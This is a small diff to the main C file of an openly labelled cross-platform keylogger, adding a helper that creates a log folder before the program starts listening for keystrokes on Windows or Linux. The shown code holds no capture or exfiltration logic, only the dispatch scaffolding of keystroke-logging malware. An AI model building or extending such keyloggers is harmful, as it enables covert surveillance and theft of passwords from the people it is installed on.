@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include "Windows/win_keylog.h"
 #include "Linux/linux_keylog.h"
+#include "writing/file.h"
 
 // folder log will contain the log files for each OS
 // the log files will be named according to the OS
@@ -16,6 +17,8 @@
 
 // calling the right keylogger depending on the OS
 int main() {
+    // Create the log folder if it doesn't exist
+    CreateLogFolder("../log");
     printf("Listening for keystrokes...\n");
     #ifdef __linux__
         // keylogger for Unix
